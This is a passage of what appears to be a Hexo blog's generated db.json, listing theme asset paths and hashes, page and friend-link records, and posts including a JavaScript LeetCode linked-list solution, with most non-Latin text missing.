":"26f0c726b75d891f52325e78f52bcecf8813e8ed","modified":1671590959602},{"_id":"public/tags/rust/index.html","hash":"d5f116bffafe1671c2c0f147667bc9451baa7329","modified":1671590959602},{"_id":"public/tags/docker/index.html","hash":"7bd09644daff703da42f5664929ff3e121fdfd35","modified":1671590959602},{"_id":"public/tags/framework/index.html","hash":"6d93655d2c1a2aaa10a0d83bad9e09d90d4cec4b","modified":1671590959602},{"_id":"public/tags/Java/index.html","hash":"91d1416f4c995db10e5efdb29c2beceb8932b354","modified":1671590959602},{"_id":"public/tags/Kotlin/index.html","hash":"2cbe01f97b2beae967412e2d172f261eeaac8d37","modified":1671590959602},{"_id":"public/tags/Kotlin/page/2/index.html","hash":"dd91788a23b2cb9b43d54e26247c7535316fa4df","modified":1671590959602},{"_id":"public/tags/git/index.html","hash":"0d8006e7a9b1ebd782676bba79c45492183dc00b","modified":1671590959602},{"_id":"public/tags/maven/index.html","hash":"e2981dd7c7fc780979c3f9ba72ae792bb0b77799","modified":1671590959602},{"_id":"public/tags/MVVM/index.html","hash":"315c66c3fcff115612e55d651b85afa494523269","modified":1671590959602},{"_id":"public/tags//index.html","hash":"230cbacb67cc75637b685e0787097c0eb7051a52","modified":1671590959602},{"_id":"public/tags/ASM/index.html","hash":"51d69a039ab8833c698125325cec10cb8a2ffc4b","modified":1671590959602},{"_id":"public/tags/Minecraft/index.html","hash":"473657770ed185914df4c4f754e852c691b17d40","modified":1671590959602},{"_id":"public/2021/11/29/async-javascript/index.html","hash":"3d7ddfdd66f15890b8d48b3b7c864a0fa6fdd6a9","modified":1671590959602},{"_id":"public/tags/Forge/index.html","hash":"023d31dbc896039a5815d96abe73bca4a453464a","modified":1671590959602},{"_id":"public/tags/Mixin/index.html","hash":"d6b44a5d9cd6ef97190ab1aac4a0915bf1df7502","modified":1671590959602},{"_id":"public/tags//index.html","hash":"398e3899dcba7a6902973a2c56c0a0ddb7e72d2a","modified":1671590959602},{"_id":"public/tags/SpringBoot/index.html","hash":"6d049d77aa432053be667a74be68d642d46a9703","modified":1671590959602},{"_id":"public/tags//index.html","hash":"45b27a20572ff8b12d4fb18aeaebf30f579e1864","modified":1671590959602},{"_id":"public/tags/Idea/index.html","hash":"1b36b9b6f6f95d180ed74f5fe5cbbb5d6b7a84ed","modified":1671590959602},{"_id":"public/tags/Compose/index.html","hash":"a994df54e0c185042522ae3a900e3c0788026492","modified":1671590959602},{"_id":"public/tags//index.html","hash":"f4a10e2099a49446d1f5cdccb337cca6e63adb85","modified":1671590959602},{"_id":"public/tags/Coroutine/index.html","hash":"d2d5ed55574e2ec31e082aeedfefeabdbabd1c54","modified":1671590959602},{"_id":"public/tags/Bukkit/index.html","hash":"14df08c3b9ef0ebee7174594275dedac409f2830","modified":1671590959602},{"_id":"public/tags/TabooLib/index.html","hash":"68357c591a69df2309d1a98f2fb0b9d7fdb81dc1","modified":1671590959602},{"_id":"public/tags//index.html","hash":"d56e8d370a6550abe358047f0f94f42c5bb05c02","modified":1671590959602},{"_id":"public/tags/Rust/index.html","hash":"15eef75042fd4037506471a1ccf348bad638014d","modified":1671590959602},{"_id":"public/tags//index.html","hash":"4de1491894070ebea99f39454b7476f69a50ebc6","modified":1671590959602},{"_id":"public/tags/JVM/index.html","hash":"ef36a4af98ca7d4f1a4a731bfbcf4320ebe1694d","modified":1671590959602},{"_id":"public/tags//index.html","hash":"6536662774c0b56c795a0be993ddde99db345edf","modified":1671590959602},{"_id":"public/tags/linux/index.html","hash":"209349e7f8bd54f384566330668c38bd4668790c","modified":1671590959602},{"_id":"public/tags/arch-linux/index.html","hash":"5135e45be5e77b02d4aa8bd31877c962b2ee38fa","modified":1671590959602},{"_id":"public/tags/Rust/index.html","hash":"782aa18ba4db78511c937f816f014fe091623a92","modified":1671590959602},{"_id":"public/CNAME","hash":"3e886ae43e8ca3ebc0096c15abd1e97ea989dba4","modified":1671590959602},{"_id":"public/medias/comment_bg.png","hash":"dfc93d24081884fbc58cab0f8fd19e77d31d6123","modified":1671590959602},{"_id":"public/medias/icp.png","hash":"27a96f31f7d0413c6ade6f40e06f021f501151c7","modified":1671590959602},{"_id":"public/libs/twikoo/twikoo.all.min.js.LICENSE.txt","hash":"6e1c8f7b23f06ca4c727c805fda053dc1d9193d0","modified":1671590959602},{"_id":"public/medias/barrager/1.png","hash":"b8c211690dba3addedfe7b928e3936cd487df0d6","modified":1671590959602},{"_id":"public/medias/barrager/0.png","hash":"b30416fd3b3aec5af3fa90823a7e2e9c0af4cda8","modified":1671590959602},{"_id":"public/medias/barrager/2.png","hash":"52b2b13373fe611ad2327b9b40426d6dc05b69cd","modified":1671590959602},{"_id":"public/medias/barrager/close.png","hash":"045346df61ee01abe5018c5d9ba805d2831ce7b1","modified":1671590959602},{"_id":"public/medias/featureimages/10.jpg","hash":"98e7f6fd9c97d4de9044b6871ca08ebf14db11b9","modified":1671590959602},{"_id":"public/medias/featureimages/13.jpg","hash":"35a320174f8e316e3eadaec658024276b651c6e9","modified":1671590959602},{"_id":"public/medias/featureimages/16.jpg","hash":"97a829c4bc94f9d2929b20a1a9b798c57b9f7205","modified":1671590959602},{"_id":"public/medias/featureimages/15.jpg","hash":"da0fbee3b7bde1607eace377ddf834c0be99edfe","modified":1671590959602},{"_id":"public/medias/featureimages/2.jpg","hash":"4bba691cf71a517ecaeaf42afd3e8f8b31e346c1","modified":1671590959602},{"_id":"public/medias/featureimages/21.jpg","hash":"b26edb128bb0bf58b23fd2f014e9555e89a2ca3b","modified":1671590959602},{"_id":"public/medias/featureimages/22.jpg","hash":"754579747a3e99747d890fca3162f370b96a7941","modified":1671590959602},{"_id":"public/medias/featureimages/23.jpg","hash":"7d7f37da3fa7128343adac23866449eb2c6a549a","modified":1671590959602},{"_id":"public/medias/featureimages/3.jpg","hash":"6ec646c2a70f5f11edacf225c1477f2200a37a96","modified":1671590959602},{"_id":"public/medias/featureimages/5.jpg","hash":"41ca20129a37fedc573eec28dd7d7b9e5b09228a","modified":1671590959602},{"_id":"public/medias/featureimages/7.jpg","hash":"7975141cd64e875122c0ea33daaca1a06bf00b8e","modified":1671590959602},{"_id":"public/medias/featureimages/8.jpg","hash":"8e4b7186352085483ca1174c7c0800114c48df8b","modified":1671590959602},{"_id":"public/medias/reward/alipay.jpg","hash":"1abc719b95d1b26f1f898e6b0a9b7609146e332f","modified":1671590959602},{"_id":"public/medias/reward/wechat.png","hash":"fe93385aa92fe328e01c8221a80b039be9e4e140","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.eot","hash":"670fb01e4930ae46fe8d6d2b75ead288f54e8e61","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.ttf","hash":"c34acd6818df6db6be41a2e331886765d601f2eb","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff","hash":"3ad4f4e4b1fb3edee3d4ba25e6cdfed2f0b88a54","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff2","hash":"13517529affa39e2585c591acae6dc336b6aa917","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.eot","hash":"54caf05a81e33d7bf04f2e420736ce6f1de5f936","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.svg","hash":"67d261ac428761389c895e1da73664e633e14a72","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.ttf","hash":"f6421c0c397311ae09f9257aa58bcd5e9720f493","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.woff","hash":"3048de344dd5cad4624e0127e58eaae4b576f574","modified":1671590959602},{"_id":"public/libs/lightGallery/img/loading.gif","hash":"15a76af2739482d8de7354abc6d8dc4fca8d145e","modified":1671590959602},{"_id":"public/libs/lightGallery/img/video-play.png","hash":"2962e03ddbe04d7e201a5acccac531a2bbccddfc","modified":1671590959602},{"_id":"public/libs/lightGallery/img/vimeo-play.png","hash":"9b72fc0f86a01467ed0b68c9cc4d604ec316d517","modified":1671590959602},{"_id":"public/libs/lightGallery/img/youtube-play.png","hash":"f8d11384d33b7a79ee2ba8d522844f14d5067a80","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.eot","hash":"00ff749c8e202401190cc98d56087cdda716abe4","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.svg","hash":"1d56c9d5db0273f07c43cc1397e440f98ba7827a","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.ttf","hash":"afd898f59d363887418669520b24d175f966a083","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.woff","hash":"2e3fce1dcfbd6e2114e7bfbeaf72d3c62e15a1bd","modified":1671590959602},{"_id":"public/favicon.png","hash":"9b84ac547aa25f45071ac7757384a63c51df7a4c","modified":1671590959602},{"_id":"public/medias/logo.png","hash":"9b84ac547aa25f45071ac7757384a63c51df7a4c","modified":1671590959602},{"_id":"public/medias/featureimages/0.jpg","hash":"1c3300f029fc85d6dda6fa4f1d699551034cdaf7","modified":1671590959602},{"_id":"public/medias/featureimages/1.jpg","hash":"684ae89de8cb7acefae19f5aee6c612037c46393","modified":1671590959602},{"_id":"public/medias/featureimages/14.jpg","hash":"38e11221406785bcd93aa9cd23e568e164630ef1","modified":1671590959602},{"_id":"public/medias/featureimages/12.jpg","hash":"8a4b2e7d92ae95c3b0c921db23c35aa9a41a7d58","modified":1671590959602},{"_id":"public/medias/featureimages/11.jpg","hash":"f55972ce7175684f2b11c3c9fc2b5b14bccbfae8","modified":1671590959602},{"_id":"public/medias/featureimages/17.jpg","hash":"42d47903551ee81885c1386022982cae165841c5","modified":1671590959602},{"_id":"public/medias/featureimages/18.jpg","hash":"64829272ec85bb819d55ff89e5b5fd6f64aa436b","modified":1671590959602},{"_id":"public/medias/featureimages/19.jpg","hash":"eb250906fdbc0c408f42ae9933725bc1a05d79fb","modified":1671590959602},{"_id":"public/medias/featureimages/20.jpg","hash":"3b11f9b461168d907073f793190865fe621a8573","modified":1671590959602},{"_id":"public/medias/featureimages/4.jpg","hash":"e06c47de27619984be9d5d02947f8370a432dfea","modified":1671590959602},{"_id":"public/medias/featureimages/6.jpg","hash":"c8f2aa4bbb041158b4e73733a341e6a77c8583f7","modified":1671590959602},{"_id":"public/medias/featureimages/9.jpg","hash":"b956a2291a04b2132366b53666cf34858b8bdb1f","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff","hash":"1e1f02bfa89e179fe2dd1383273b8812aa873418","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff2","hash":"0613c7ebba55ee47ef302c0f7766324692f899a7","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff","hash":"a22acd7697f36e7d4cc31a853c70e776eac54bb1","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff2","hash":"0ccb2c814a7e4ca12c4778821633809cb0361eaa","modified":1671590959602},{"_id":"public/css/barrager.css","hash":"862879d9313ed8d4c721fa32ef8f94ac2f0a28ae","modified":1671590959602},{"_id":"public/css/gallery.css","hash":"79dfdf68d675c17782271647283c568d086e4b98","modified":1671590959602},{"_id":"public/css/my-gitalk.css","hash":"af18dd29e58642c18bab9b89541767b494c468dd","modified":1671590959602},{"_id":"public/css/my.css","hash":"497e50351f7838f8546cac76850a42e7e380a110","modified":1671590959602},{"_id":"public/css/bb.css","hash":"aa15633888c7cf9baea8bb48d796c68b57cf14bf","modified":1671590959602},{"_id":"public/css/gitment.css","hash":"2bd15cc17dca35ac3ecc0acf167a23a1dd362acd","modified":1671590959602},{"_id":"public/js/jquery.barrager.js","hash":"19c8b2498ca1083e537f7f443172970912107f83","modified":1671590959602},{"_id":"public/js/gallery-encrypt.js","hash":"18dcfa4a8da8847b64be75f287f45c0e830bbcab","modified":1671590959602},{"_id":"public/js/search.js","hash":"5caa2d6e3d34c334ac68dfaafc81a583d6123382","modified":1671590959602},{"_id":"public/js/matery.js","hash":"b86de5fe3e9766b7ff80df12ea41c3a9e30825f7","modified":1671590959602},{"_id":"public/libs/aos/aos.js","hash":"02bfb40b0c4b6e9b0b4081218357145cbb327d74","modified":1671590959602},{"_id":"public/libs/aplayer/APlayer.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1671590959602},{"_id":"public/libs/background/ribbon-dynamic.js","hash":"052b80c29e6bc585aa28d4504b743bdbac220a88","modified":1671590959602},{"_id":"public/libs/background/canvas-nest.js","hash":"65333d0dbb9c1173a1b13031b230161fc42c8b2f","modified":1671590959602},{"_id":"public/libs/background/ribbon-refresh.min.js","hash":"6d98692b2cad8c746a562db18b170b35c24402f4","modified":1671590959602},{"_id":"public/libs/background/ribbon.min.js","hash":"6a99d494c030388f96f6086a7aaa0f03f3fe532e","modified":1671590959602},{"_id":"public/libs/codeBlock/codeBlockFuction.js","hash":"c7ab06d27a525b15b1eb69027135269e9b9132fb","modified":1671590959602},{"_id":"public/libs/codeBlock/codeCopy.js","hash":"6d39a766af62e625f177c4d5cf3adc35eed71e61","modified":1671590959602},{"_id":"public/libs/codeBlock/codeLang.js","hash":"bac88b4d4e3679732d29bd037c34f089cf27cf05","modified":1671590959602},{"_id":"public/libs/codeBlock/codeShrink.js","hash":"201e8cd761b4be557247bdaf1ebc7c11c83194f6","modified":1671590959602},{"_id":"public/libs/instantpage/instantpage.js","hash":"83ce8919b1a69b2f1809ffaf99b52a8627e650e9","modified":1671590959602},{"_id":"public/libs/jqcloud/jqcloud-1.0.4.min.js","hash":"257eaae3020599e4939f50d5008a743827f25b8c","modified":1671590959602},{"_id":"public/libs/jqcloud/jqcloud.css","hash":"20d9f11a19d95c70e27cb922e0d6dccbec4eae89","modified":1671590959602},{"_id":"public/libs/minivaline/MiniValine.js","hash":"f7f6cdc1b22297e02334e304444e9a8351acb455","modified":1671590959602},{"_id":"public/libs/others/busuanzi.pure.mini.js","hash":"6e41f31100ae7eb3a6f23f2c168f6dd56e7f7a9a","modified":1671590959602},{"_id":"public/libs/others/clicklove.js","hash":"6a39b8c683ba5dcd92f70c6ab45d1cfac3213e8e","modified":1671590959602},{"_id":"public/libs/others/snow.js","hash":"02b1eeaca737c47be637b304feb3d36d792ee0c4","modified":1671590959602},{"_id":"public/libs/others/star.js","hash":"cf32f8ce2a1a51ba65d3b6063fe2ee1482550190","modified":1671590959602},{"_id":"public/libs/prism/prism.css","hash":"f1a273e896538fa4e11cb70acc5ec7e88d8b6c4c","modified":1671590959602},{"_id":"public/libs/scrollprogress/scrollProgress.min.js","hash":"777ffe5d07e85a14fbe97d846f45ffc0087251cc","modified":1671590959602},{"_id":"public/libs/tocbot/tocbot.css","hash":"9ab8ef576c9a57115194152e79cca79b0a41dd70","modified":1671590959602},{"_id":"public/libs/tocbot/tocbot.min.js","hash":"5ec27317f0270b8cf6b884c6f12025700b9a565c","modified":1671590959602},{"_id":"public/libs/share/css/share.min.css","hash":"8a778a86f3ce9a042df6be63a9f1039631e351a5","modified":1671590959602},{"_id":"public/css/matery.css","hash":"1ea56cd7562b2604cf7555730a0524f83d867615","modified":1671590959602},{"_id":"public/js/crypto-js.js","hash":"3dd73b6f13dc818a3a9c5c7424c1c4a9649b00a2","modified":1671590959602},{"_id":"public/libs/aos/aos.css","hash":"191a3705a8f63e589a50a0ff2f2c5559f1a1b6b2","modified":1671590959602},{"_id":"public/libs/animate/animate.min.css","hash":"97afa151569f046b2e01f27c1871646e9cd87caf","modified":1671590959602},{"_id":"public/libs/aplayer/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1671590959602},{"_id":"public/libs/cryptojs/crypto-js.min.js","hash":"5989527a378b55011a59522f41eeb3981518325c","modified":1671590959602},{"_id":"public/libs/dplayer/DPlayer.min.css","hash":"f7d19655f873b813ffba5d1a17145c91f82631b8","modified":1671590959602},{"_id":"public/libs/gitalk/gitalk.css","hash":"61d71cb30f5f34cbb1f2b5bc469784d6cb908c22","modified":1671590959602},{"_id":"public/libs/dplayer/DPlayer.min.js","hash":"490148a22ab2b03a880495cc733ecd1840c02ed6","modified":1671590959602},{"_id":"public/libs/gitment/gitment-default.css","hash":"2903c59ee06b965bef32e937bd69f5b0b2190717","modified":1671590959602},{"_id":"public/libs/gitment/gitment.js","hash":"28c02c45ce568e084cd1041dc493f83f9c6c88c6","modified":1671590959602},{"_id":"public/libs/jquery/jquery.min.js","hash":"2115753ca5fb7032aec498db7bb5dca624dbe6be","modified":1671590959602},{"_id":"public/libs/masonry/masonry.pkgd.min.js","hash":"d20252cf76c3be8af37a8415d13ad368c762b4d8","modified":1671590959602},{"_id":"public/libs/materialize/materialize.min.css","hash":"a69d456e3345e7f59cd0d47d1b3e70fd4a496a05","modified":1671590959602},{"_id":"public/libs/others/sakura-half.js","hash":"a41b64af88fdd0e2d3502752d059661c1bc743dc","modified":1671590959602},{"_id":"public/libs/materialize/materialize.min.js","hash":"c8b4c65651921d888cf5f27430dfe2ad190d35bf","modified":1671590959602},{"_id":"public/libs/others/sakura-reduce.js","hash":"f7527e9fb4e6fe2cc7c8880692d77bcda95900c7","modified":1671590959602},{"_id":"public/libs/others/sakura-small.js","hash":"3284a9ab71454e574d80663f3a05735cd12a6a05","modified":1671590959602},{"_id":"public/libs/others/sakura.js","hash":"9e196ab241799126e6a2dd23ee1708b1505ccbf0","modified":1671590959602},{"_id":"public/libs/valine/av-min.js","hash":"541efb9edc1ce425cbe3897cfc25803211fe6a05","modified":1671590959602},{"_id":"public/libs/valine/Valine.min.js","hash":"6cbdbf91e1f046dd41267a5ff0691a1fccba99df","modified":1671590959602},{"_id":"public/libs/awesome/css/all.css","hash":"8a4a55db46c5dbfef9c6703fa2d04e89cbfcf633","modified":1671590959602},{"_id":"public/libs/lightGallery/css/lightgallery.min.css","hash":"1b7227237f9785c66062a4811508916518e4132c","modified":1671590959602},{"_id":"public/libs/awesome/css/all.min.css","hash":"a57ee68d11601b0fd8e5037fc241ff65a754473c","modified":1671590959602},{"_id":"public/libs/lightGallery/js/lightgallery-all.min.js","hash":"9f5ef4bc8a0a3c746ca4f3c3e6d64493b1a977d8","modified":1671590959602},{"_id":"public/libs/share/js/jquery.share.min.js","hash":"41367dcb857e02e3c417ebe68a554ce1d4430806","modified":1671590959602},{"_id":"public/libs/share/js/social-share.min.js","hash":"a3090a02786dcd4efc6355c1c1dc978add8d6827","modified":1671590959602},{"_id":"public/libs/twikoo/twikoo.all.min.js","hash":"c3f5f0a69b7864e7ef5bbf99fc774bec37947d7c","modified":1671590959602},{"_id":"public/medias/avatar.jpg","hash":"7f3944f24beb7f74c0002f9bd66bb69160092ebd","modified":1671590959602},{"_id":"public/medias/cover.jpg","hash":"d4957ff7cc5e88555cd840f2956ab0561e6f1ccf","modified":1671590959602},{"_id":"public/medias/images/02.jpg","hash":"a5b656606811f4d7e10307f48c0e3c373e0b886d","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.eot","hash":"d1ffd6340cdbf72890ccb67f32015eafc5df51a7","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.ttf","hash":"8ab907083fecaaa2a9ec93b27f884ad74573705c","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.svg","hash":"229deca2465fa9efc8c03d0ebeb9a01c1559822e","modified":1671590959602},{"_id":"public/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1671590959602},{"_id":"public/libs/gitalk/gitalk.min.js","hash":"564fc7c731d05fa70d71ef853a2c8cc7725739e2","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.eot","hash":"ea845c59bee4a5c6db774b8d8060f5641b789ae9","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.ttf","hash":"eb8914f6b1797b45ee0883e6089d92695d9f9441","modified":1671590959602},{"_id":"public/medias/images/03.jpg","hash":"2bd3815508a9f5b0ae79aa780bc02ac80b2a354e","modified":1671590959602},{"_id":"public/medias/banner/3.jpg","hash":"e90bf089aefe9335533e3100b8884efbf5afe4f1","modified":1671590959602},{"_id":"public/medias/banner/0.jpg","hash":"533c654621b62b59e5e2bb34e1d395d2df1ac9d0","modified":1671590959602},{"_id":"public/medias/banner/1.jpg","hash":"120e44d82a71a53753d341b40d296d88a988b6a4","modified":1671590959602},{"_id":"public/medias/images/01.jpg","hash":"6a81f437fb876666bafaa98b2a09bd8bd7f21832","modified":1671590959602},{"_id":"public/medias/banner/4.jpg","hash":"3550f27acfacd334a55ee3a8ef4d55a364071347","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.svg","hash":"b7fd3035e83c23c720c9f5957af31d7e288fb4eb","modified":1671590959602},{"_id":"public/medias/banner/5.jpg","hash":"ed1bdfb61dae0cc949fc0bb15a057b7aa957ec92","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.svg","hash":"023bb481b65dd8cdeb8c424ca900f3866292bfb0","modified":1671590959602},{"_id":"public/medias/banner/2.jpg","hash":"8148fbb013e119e345c01bfcd3b95a8bbfb28339","modified":1671590959602},{"_id":"public/medias/banner/6.jpg","hash":"cd8f514ad8db1b74d541f83b987b2f17f8e1211c","modified":1671590959602}],"Category":[{"name":"","_id":"clbx23jsy0004sfklh6q8cvzl"},{"name":"","_id":"clbx23jt5000csfkl1nu38gkl"},{"name":"","_id":"clbx23jty002psfkl4w9y0uxc"}],"Data":[{"_id":"friends","data":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}],"Page":[{"title":"404","date":"2018-09-30T09:25:30.000Z","type":"404","layout":"404","description":"Oops :(","_content":"","source":"404/index.md","raw":"---\ntitle: 404\ndate: 2018-09-30 17:25:30\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops :(\"\n---","updated":"2021-11-08T17:44:03.000Z","path":"404/index.html","comments":1,"_id":"clbx23jso0000sfklfi18102e","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","type":"categories","layout":"categories","_content":"\n","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2018-09-30 17:25:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n\n","updated":"2021-11-08T17:38:50.000Z","path":"categories/index.html","comments":1,"_id":"clbx23jsv0002sfkldlycaewn","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","type":"about","layout":"about","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2018-09-30 17:25:30\ntype: \"about\"\nlayout: \"about\"\n---","updated":"2021-11-08T17:40:19.000Z","path":"about/index.html","comments":1,"_id":"clbx23jt00006sfklaeee6ti8","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","type":"contact","layout":"contact","_content":"","source":"contact/index.md","raw":"---\ntitle: contact\ndate: 2018-09-30 17:25:30\ntype: \"contact\"\nlayout: \"contact\"\n---","updated":"2021-11-08T17:41:42.000Z","path":"contact/index.html","comments":1,"_id":"clbx23jt20008sfklej5yah6y","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""},{"title":"tags","date":"2018-09-30T10:23:38.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2018-09-30 18:23:38\ntype: \"tags\"\nlayout: \"tags\"\n---\n","updated":"2021-11-08T17:39:24.000Z","path":"tags/index.html","comments":1,"_id":"clbx23jt3000asfklbu9z0toc","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""},{"title":"friends","date":"2018-12-12T13:25:30.000Z","type":"friends","layout":"friends","_content":"","source":"friends/index.md","raw":"---\ntitle: friends\ndate: 2018-12-12 21:25:30\ntype: \"friends\"\nlayout: \"friends\"\n---\n","updated":"2021-11-08T17:42:15.000Z","path":"friends/index.html","comments":1,"_id":"clbx23jt5000fsfklfpke70rf","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":""}],"Post":[{"title":"2022","date":"2022-12-20T16:00:00.000Z","author":"","hide":false,"_content":"\n# 2022\n\n> \n>\n> \n>\n>    \n>\n> \n\n","source":"_posts/2022.md","raw":"---\ntitle: 2022\ndate: 2022-12-21\nauthor: \nhide: false\ncategories: \ntags:\n  - \n---\n\n# 2022\n\n> \n>\n> \n>\n>    \n>\n> \n\n","slug":"2022","published":1,"updated":"2022-12-21T02:33:19.593Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jsr0001sfklfi3vci2u","content":"<h1 id=\"2022\"><a href=\"#2022\" class=\"headerlink\" title=\"2022\"></a>2022</h1><blockquote>\n<p></p>\n<p></p>\n<p>   </p>\n<p></p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"2022\"><a href=\"#2022\" class=\"headerlink\" title=\"2022\"></a>2022</h1><blockquote>\n<p></p>\n<p></p>\n<p>   </p>\n<p></p>\n</blockquote>\n"},{"title":"","date":"2022-09-29T16:00:00.000Z","author":"","hide":false,"summary":"","_content":"\n# \n\n## \n\n\n\n> #### [ Offer 22. k](https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/)\n>\n> k11\n>\n>  6  123456 3  4 \n>\n>  \n>\n> \n>\n> >  : 1->2->3->4->5,  k = 2.\n> >\n> >  4->5.\n\n~~~js\n/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */\n/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */\nvar getKthFromEnd = function(head, k) {\n    let [fast, slow] = [head, head]\n    while (fast && k > 0) {\n        [fast, k] = [fast.next, k - 1]\n    }\n    while (fast) {\n        [fast, slow] = [fast.next, slow.next]\n    }\n    return slow\n};\n~~~\n\nfastk+1fastslowfastslow\n\nlenfastk+1slowfastlen-(k+1)k","source":"_posts/algorithm-learning.md","raw":"---\ntitle: \ndate: 2022-9-30\nauthor: \nhide: false\nsummary: \ncategories: \ntags:\n  - \n---\n\n# \n\n## \n\n\n\n> #### [ Offer 22. k](https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/)\n>\n> k11\n>\n>  6  123456 3  4 \n>\n>  \n>\n> \n>\n> >  : 1->2->3->4->5,  k = 2.\n> >\n> >  4->5.\n\n~~~js\n/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */\n/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */\nvar getKthFromEnd = function(head, k) {\n    let [fast, slow] = [head, head]\n    while (fast && k > 0) {\n        [fast, k] = [fast.next, k - 1]\n    }\n    while (fast) {\n        [fast, slow] = [fast.next, slow.next]\n    }\n    return slow\n};\n~~~\n\nfastk+1fastslowfastslow\n\nlenfastk+1slowfastlen-(k+1)k","slug":"algorithm-learning","published":1,"updated":"2022-12-12T15:56:46.787Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jsw0003sfkl2mzc28th","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<blockquote>\n<h4 id=\"-Offer-22-k\"><a href=\"#-Offer-22-k\" class=\"headerlink\" title=\" Offer 22. k\"></a><a href=\"https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\"> Offer 22. 